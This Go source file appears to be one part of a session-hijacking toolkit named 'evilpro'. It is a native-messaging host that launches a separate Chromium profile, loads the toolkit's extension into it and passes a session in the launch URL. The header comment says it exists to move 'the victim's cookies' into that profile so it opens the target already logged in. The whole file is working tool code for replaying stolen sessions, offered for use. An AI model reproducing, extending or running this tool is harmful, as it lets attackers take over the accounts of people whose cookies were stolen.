// Command evilpro-host is a browser native-messaging host.
//
// Why it exists: an extension cannot create a browser profile. It can only open
// windows inside the profile it already lives in (plus, when it runs spanning, the
// private store). A genuinely independent profile needs a new browser process with
// its own --user-data-dir, and launching a process needs something outside the
// browser. This is that something.
//
// A launched profile is only useful if the victim's cookies get into it. The
// extension cannot write them across profiles, so the host passes the whole
// session in the launch URL: the new browser is started with --load-extension
// pointing at this extension (so the same code is running in the new profile, with
// a stable extension id baked into the manifest), and the URL is that extension's
// paste page carrying the session in its fragment. The new profile therefore seeds
// itself, then opens the target.
//
// Chromium family only: Firefox has no --load-extension equivalent.
package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
)

type config struct {
	Browser       string `json:"browser"`
	ExtensionsDir string `json:"extensionPath"`
	ProfilesDir   string `json:"profilesDir"`
}

type request struct {
	Action      string `json:"action"`
	Name        string `json:"name"`
	URL         string `json:"url"`
	BrowserHint string `json:"browserHint"`
	Payload     string `json:"payload"` // base64url JSON, opaque to the host
}

type response struct {
	OK       bool     `json:"ok"`
	Error    string   `json:"error,omitempty"`
	Browser  string   `json:"browser,omitempty"`
	ExtPath  string   `json:"extPath,omitempty"`
	ExtID    string   `json:"extId,omitempty"`
	Profile  string   `json:"profile,omitempty"`
	Pid      int      `json:"pid,omitempty"`
	Profiles []string `json:"profiles,omitempty"`
}

func exeDir() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Dir(exe)
	}
	wd, _ := os.Getwd()
	return wd
}

func loadConfig() config {
	var c config
	b, err := os.ReadFile(filepath.Join(exeDir(), "host.json"))
	if err == nil {
		_ = json.Unmarshal(b, &c)
	}
	if c.ExtensionsDir == "" {
		// host lives in <extension>/host/bin/ or <extension>/host/
		d := exeDir()
		if filepath.Base(d) == "bin" {
			c.ExtensionsDir = filepath.Dir(filepath.Dir(d))
		} else {
			c.ExtensionsDir = filepath.Dir(d)
		}
		// ...but only a directory holding manifest.json is the extension
		if !fileExists(filepath.Join(c.ExtensionsDir, "manifest.json")) {
			for _, cand := range []string{filepath.Dir(d), d} {
				if fileExists(filepath.Join(cand, "manifest.json")) {
					c.ExtensionsDir = cand
					break
				}
			}
		}
	}
	if c.ProfilesDir == "" {
		base, err := os.UserConfigDir()
		if err != nil {
			base = exeDir()
		}
		c.ProfilesDir = filepath.Join(base, "evil-pro", "profiles")
	}
	return c
}

func fileExists(p string) bool {
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}

var slugRe = regexp.MustCompile(`[^A-Za-z0-9._@-]+`)

func slug(name string) string {
	s := slugRe.ReplaceAllString(strings.TrimSpace(name), "-")
	s = strings.Trim(s, "-.")
	if s == "" {
		s = "session"
	}
	if len(s) > 60 {
		s = s[:60]
	}
	return strings.ToLower(s)
}

// findBrowser honours an explicit config path, then the browser the extension is
// running in, then any known Chromium-family binary.
func findBrowser(cfg config, hint string) (string, error) {
	if cfg.Browser != "" && fileExists(cfg.Browser) {
		return cfg.Browser, nil
	}
	var names []string
	switch strings.ToLower(hint) {
	case "brave":
		names = []string{"brave", "brave-browser", "brave.exe"}
	case "edge":
		names = []string{"msedge", "msedge.exe", "microsoft-edge"}
	default:
		names = []string{"chrome", "chrome.exe", "google-chrome", "google-chrome-stable", "chromium", "chromium-browser", "brave", "brave.exe", "msedge", "msedge.exe"}
	}
	if p := lookNames(names); p != "" {
		return p, nil
	}
	return registryBrowser(hint)
}

func lookNames(names []string) string {
	for _, n := range names {
		if p, err := exec.LookPath(n); err == nil {
			return p
		}
	}
	return ""
}

func registryBrowser(hint string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("no chromium-family browser found on PATH")
	}
	exes := []string{"chrome.exe", "brave.exe", "msedge.exe"}
	if strings.EqualFold(hint, "brave") {
		exes = []string{"brave.exe", "chrome.exe", "msedge.exe"}
	} else if strings.EqualFold(hint, "edge") {
		exes = []string{"msedge.exe", "chrome.exe", "brave.exe"}
	}
	for _, exe := range exes {
		for _, root := range []string{"HKLM", "HKCU"} {
			key := root + `\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\` + exe
			out, err := exec.Command("reg", "query", key, "/ve").Output()
			if err != nil {
				continue
			}
			for _, line := range strings.Split(string(out), "\n") {
				i := strings.Index(line, "REG_SZ")
				if i < 0 {
					continue
				}
				p := strings.TrimSpace(line[i+len("REG_SZ"):])
				if fileExists(p) {
					return p, nil
				}
			}
		}
	}
	return "", fmt.Errorf("no chromium-family browser found (set \"browser\" in host.json)")
}

func readMsg(r io.Reader) ([]byte, error) {
	var n uint32
	if err := binary.Read(r, binary.LittleEndian, &n); err != nil {
		return nil, err
	}
	if n == 0 || n > 64*1024*1024 {
		return nil, fmt.Errorf("bad message length %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(r, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func writeMsg(w io.Writer, v interface{}) error {
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	if err := binary.Write(w, binary.LittleEndian, uint32(len(b))); err != nil {
		return err
	}
	_, err = w.Write(b)
	return err
}

func main() {
	cfg := loadConfig()

	// Command-line mode, so installers and humans can use the same actions.
	if len(os.Args) > 1 {
		var resp response
		switch os.Args[1] {
		case "install":
			resp = install(cfg)
		case "ping":
			if b, err := findBrowser(cfg, ""); err != nil {
				resp = response{Error: err.Error()}
			} else {
				resp = response{OK: true, Browser: b, ExtPath: cfg.ExtensionsDir, ExtID: extID(cfg)}
			}
		case "list":
			resp = listProfiles(cfg)
		default:
			fmt.Fprintln(os.Stderr, "usage: evilpro-host [install|ping|list]")
			os.Exit(2)
		}
		out, _ := json.MarshalIndent(resp, "", "  ")
		fmt.Println(string(out))
		if !resp.OK && resp.Error != "" {
			os.Exit(1)
		}
		return
	}

	for {
		raw, err := readMsg(os.Stdin)
		if err != nil {
			return
		}
		var req request
		if err := json.Unmarshal(raw, &req); err != nil {
			_ = writeMsg(os.Stdout, response{Error: err.Error()})
			continue
		}

		var resp response
		switch req.Action {
		case "ping":
			b, err := findBrowser(cfg, req.BrowserHint)
			if err != nil {
				resp = response{Error: err.Error()}
				break
			}
			resp = response{OK: true, Browser: b, ExtPath: cfg.ExtensionsDir, ExtID: extID(cfg)}
		case "launch":
			resp = launch(cfg, req)
		case "list":
			resp = listProfiles(cfg)
		case "install":
			resp = install(cfg)
		default:
			resp = response{Error: "unknown action: " + req.Action}
		}
		if err := writeMsg(os.Stdout, resp); err != nil {
			return
		}
	}
}

// extID is the extension id derived from the manifest "key": the first 32 hex
// chars of SHA256(SPKI) with each nibble mapped 0-f -> a-p.
func extID(cfg config) string {
	raw, err := os.ReadFile(filepath.Join(cfg.ExtensionsDir, "manifest.json"))
	if err != nil {
		return ""
	}
	var m struct {
		Key string `json:"key"`
	}
	if json.Unmarshal(raw, &m) != nil || m.Key == "" {
		return ""
	}
	der, err := base64.StdEncoding.DecodeString(m.Key)
	if err != nil {
		return ""
	}
	hexs := fmt.Sprintf("%x", sha256.Sum256(der))[:32]
	var b strings.Builder
	for _, ch := range hexs {
		v := int(ch - '0')
		if ch >= 'a' {
			v = int(ch-'a') + 10
		}
		b.WriteByte(byte('a' + v))
	}
	return b.String()
}

func launch(cfg config, req request) response {
	browser, err := findBrowser(cfg, req.BrowserHint)
	if err != nil {
		return response{Error: err.Error()}
	}
	if cfg.ExtensionsDir == "" || !fileExists(filepath.Join(cfg.ExtensionsDir, "manifest.json")) {
		return response{Error: "extension folder not found near host.json"}
	}
	id := extID(cfg)
	if id == "" {
		return response{Error: "could not read the extension key from manifest.json"}
	}
	name := slug(req.Name)
	dir := filepath.Join(cfg.ProfilesDir, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return response{Error: err.Error()}
	}

	url := req.URL
	if req.Payload != "" {
		url = fmt.Sprintf("chrome-extension://%s/paste.html#p=%s", id, req.Payload)
	}
	if len(url) > 30000 {
		// the OS command line is capped around 32k on Windows
		return response{Error: "session too large for a launch URL"}
	}

	args := []string{
		"--user-data-dir=" + dir,
		"--load-extension=" + cfg.ExtensionsDir,
		"--no-first-run",
		"--no-default-browser-check",
		"--restore-last-session=false",
		url,
	}
	cmd := exec.Command(browser, args...)
	detach(cmd)
	if err := cmd.Start(); err != nil {
		return response{Error: err.Error()}
	}
	go func() { _ = cmd.Wait() }()
	return response{OK: true, Browser: browser, Profile: dir, Pid: cmd.Process.Pid}
}

func listProfiles(cfg config) response {
	ents, err := os.ReadDir(cfg.ProfilesDir)
	if err != nil {
		return response{OK: true}
	}
	var out []string
	for _, e := range ents {
		if e.IsDir() {
			out = append(out, e.Name())
		}
	}
	sort.Strings(out)
	return response{OK: true, Profiles: out}
}
